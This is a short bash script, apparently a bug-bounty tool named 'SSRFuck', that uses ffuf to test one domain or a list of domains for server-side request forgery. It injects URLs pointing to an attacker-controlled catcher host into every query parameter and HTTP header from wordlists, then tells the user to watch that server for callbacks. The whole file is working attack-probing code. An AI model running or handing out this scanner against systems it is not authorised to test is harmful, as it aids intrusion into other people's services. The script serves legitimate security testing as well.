#!/usr/bin/env bash

# Function to display the usage message
usage() {
    echo "Usage: $0 [-d DOMAIN | -l LIST_FILE]"
    echo "  -d DOMAIN       Scan a single domain"
    echo "  -l LIST_FILE    Scan a list of domains from a file"
    exit 1
}

# Function to display the banner
banner() {
    echo -en "\033[31m"
    cat << "EOF"
 _____ _________________          _    
/  ___/  ___| ___ \  ___|        | |   
\ `--.\ `--.| |_/ / |_ _   _  ___| | __
 `--. \`--. \    /|  _| | | |/ __| |/ /
/\__/ /\__/ / |\ \| | | |_| | (__|   < 
\____/\____/\_| \_\_|  \__,_|\___|_|\_\
                                       
    # By 2RS3C (https://twitter.com/2RS3C)
EOF
    echo -en "\033[0m"
}

# Function to fuzz parameters
fuzz_params() {
    echo "[-] Fuzzing parameters in ${DOMAIN}."
    ffuf -w parameters.txt -u "${DOMAIN}?FUZZ=https:%2F%2FFUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-parameters.json >> ./ffuf-output/fuzzing.log 2>&1
}

# Function to fuzz headers
fuzz_headers() {
    echo "[-] Fuzzing headers in ${DOMAIN}."
    ffuf -w headers.txt -u "${DOMAIN}" -H "FUZZ: http://FUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-headers.json >> ./ffuf-output/fuzzing.log 2>&1
}

# Function to scan a list of domains
scan_list() {
    if [ -z "$LIST_FILE" ] || [ ! -f "$LIST_FILE" ]; then
        echo "Error: List file is required and must exist."
        exit 1
    fi

    while IFS= read -r line; do
        DOMAIN=$line
        DOMAIN_CLEAN=$(echo ${DOMAIN} | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's/:[0-9]*$//')

        echo "[-] Fuzzing parameters in ${DOMAIN}."
        ffuf -w /home/kali/Desktop/Tools/ssrfuck/parameters.txt -u "${DOMAIN}?FUZZ=https:%2F%2FFUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-parameters.json >> ./ffuf-output/fuzzing.log 2>&1
        
        echo "[-] Fuzzing headers in ${DOMAIN}."
        ffuf -w /home/kali/Desktop/Tools/ssrfuck/headers.txt -u "${DOMAIN}" -H "FUZZ: http://FUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-headers.json >> ./ffuf-output/fuzzing.log 2>&1

        echo "[+] Done fuzzing in ${DOMAIN}."
    done < "$LIST_FILE"

    echo "[+] Done fuzzing all domains in ${LIST_FILE}."
    echo "[+] Check for requests on your server (${SSRF_CATCHER})."
}

# Parse command line options
while getopts ":d:l:" opt; do
    case ${opt} in
        d )
            DOMAIN=$OPTARG
            ;;
        l )
            LIST_FILE=$OPTARG
            ;;
        \? )
            usage
            ;;
        : )
            echo "Invalid option: -$OPTARG requires an argument."
            usage
            ;;
    esac
done

# Validate input
if [ -z "$DOMAIN" ] && [ -z "$LIST_FILE" ]; then
    usage
fi

# Create the output directory if it doesn't exist
mkdir -p ./ffuf-output

# Clean domain for single domain scan
if [ ! -z "$DOMAIN" ]; then
    DOMAIN_CLEAN=$(echo ${DOMAIN} | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's/:[0-9]*$//')

    banner

    echo "[-] Fuzzing parameters in ${DOMAIN}."
    fuzz_params

    echo "[-] Fuzzing headers in ${DOMAIN}."
    fuzz_headers

    echo "[+] Done fuzzing in ${DOMAIN}."
    echo "[+] Check for requests on your server (${SSRF_CATCHER})."
fi

# Scan list if provided
if [ ! -z "$LIST_FILE" ]; then
    banner
    scan_list
fi
